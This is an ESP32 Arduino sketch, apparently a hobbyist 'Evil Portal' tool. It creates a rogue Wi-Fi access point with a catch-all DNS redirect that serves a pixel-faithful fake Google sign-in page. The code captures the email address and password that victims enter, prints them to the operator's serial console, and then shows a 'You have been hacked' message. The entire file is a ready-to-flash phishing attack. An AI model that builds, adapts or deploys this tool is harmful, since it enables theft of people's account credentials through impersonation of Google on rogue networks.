#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

const byte DNS_PORT = 53;
IPAddress apIP(172, 0, 0, 1);

DNSServer dnsServer;
WebServer server(80);

String inputSSID = "";
String inputPASS = "";

// ========== FAKE PAGE ==========
const char loginPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <style>
    body { font-family: sans-serif; }
    .login-container { width: 85%; margin: auto; padding: 20px; border-radius: 5px; margin-top: 10px; }
    #logo { margin: auto; width: fit-content; }
    .g-h1 { font-size: 25px; text-align: center; font-weight: 200; margin: auto; }
    .g-h2 { font-size: 15px; text-align: center; font-weight: 200; margin: auto; }
    .g-input { width: 95%; height: 30px; background-color: transparent; font: 400 16px Roboto, Helvetica, Arial, sans-serif;
      border-width: 0.5px; border-color: rgba(0, 0, 0, 0.6); border-radius: 4px; font-size: 16px; padding: 13px 9px; margin-bottom: 10px; }
    .create-account { font-size: smaller; color: #1a73e8; text-decoration: none; font-family: "Google Sans", Roboto, Arial, sans-serif;
      font-size: 15px; letter-spacing: 0.25px; }
    .gbtn-primary { min-width: 64px; border: none; margin-top: 6px; margin-bottom: 6px; height: 36px; border-radius: 4px;
      font-family: "Google Sans", Roboto, Arial, sans-serif; font-size: 15px; font-weight: 500; padding: 0 24px;
      background-color: rgb(26, 115, 232); color: #fff; }
    .button-container { display: flex; justify-content: space-between; align-items: center; }
    .text { font-family: Roboto, Arial, sans-serif; color: #5f6368; font-size: 14px; line-height: 1.4286;
      padding-bottom: 3px; padding-top: 9px; }
    .txt { text-decoration: none; border-radius: 4px; color: #1a73e8; }
  </style>
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
</head>
<body>
  <div class="login-container">
    <div id="logo">
      <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <g><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"/></g>
        <g><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"/></g>
        <g><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"/></g>
        <g><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"/></g>
        <g><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"/></g>
        <g><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"/></g>
      </svg>
    </div>
    <form method="POST" action="/login">
      <h1 class="g-h1">Sign in</h1>
      <h2 class="g-h2">Use your Google Account</h2>
      <input name="email" type="text" class="g-input" placeholder="Email or phone" required>
      <input name="password" type="password" class="g-input" placeholder="Enter your password" required>
      <div class="text">Not your computer? Use Guest mode to sign in privately. <a href="#" class="txt">Learn more</a></div>
      <div class="button-container">
        <a class="create-account" href="#">Create account</a>
        <button class="gbtn-primary" type="submit">Next</button>
      </div>
    </form>
  </div>
</body>
</html>
)rawliteral";

// ========== WAIT FOR SERIAL INPUT ==========
void waitForSerialInput() {
  Serial.println("Enter SSID:");
  while (inputSSID == "") {
    if (Serial.available()) {
      inputSSID = Serial.readStringUntil('\n');
      inputSSID.trim();
    }
  }

  Serial.println("Enter PASSWORD (min 8 chars for WPA2, or leave it empty for open network):");
  while (inputPASS == "") {
    if (Serial.available()) {
      inputPASS = Serial.readStringUntil('\n');
      inputPASS.trim();
      break;
    }
  }
}

// ========== HANDLE LOGIN FORM ==========
void handleLogin() {
  String email = server.arg("email");
  String pass = server.arg("password");
  Serial.println("📧 Email: " + email);
  Serial.println("🔐 Password: " + pass);
  server.send(200, "text/html", "<h3>Warning: You have been hacked</h3>");
}

// ========== SETUP ==========
void setup() {
  Serial.begin(115200);
  delay(1000);

  Serial.println("                              Super Google                              ");
  Serial.println("                                                                        ");
  Serial.println("                                   =                                    ");
  Serial.println("                                ==   ==                                 ");
  Serial.println("                              ==       ==                               ");
  Serial.println("                            ==           ==                             ");
  Serial.println("                          ==               ==                           ");
  Serial.println("                        ==                   ==                         ");
  Serial.println("                      ==           ***         ==                       ");
  Serial.println("                    ==           ***             ==                     ");
  Serial.println("                  ==           ***                 ==                   ");
  Serial.println("                ==           ***                     ==                 ");
  Serial.println("              ==           *****************           ==               ");
  Serial.println("            ==                         ***               ==             ");
  Serial.println("          ==                         ***                   ==           ");
  Serial.println("        ==                         ***                       ==         ");
  Serial.println("      ==                        ********                       ==       ");
  Serial.println("    ==                            ****                           ==     ");
  Serial.println("  ==                               **                              ==   ");
  Serial.println("==                                                                   == ");
  Serial.println("   = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =    ");
  Serial.println("                                                                        ");
  Serial.println("                                by: dfyR433                             ");
  delay(500);

  waitForSerialInput();

  WiFi.mode(WIFI_AP);
  if (inputPASS.length() >= 8) {
    WiFi.softAP(inputSSID.c_str(), inputPASS.c_str());  // WPA2
  } else {
    WiFi.softAP(inputSSID.c_str());  // Open AP
  }
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));

  dnsServer.start(DNS_PORT, "*", apIP);

  server.on("/", HTTP_GET, []() {
    server.send(200, "text/html", loginPage);
  });
  server.on("/login", HTTP_POST, handleLogin);
  server.onNotFound([]() {
    server.send(200, "text/html", loginPage);
  });

  server.begin();
  Serial.println("[✅] Evil Portal active on SSID: " + inputSSID);
  Serial.println("[🌐] Connect to http://172.0.0.1 or wait for popup...");
}

// ========== LOOP ==========
void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
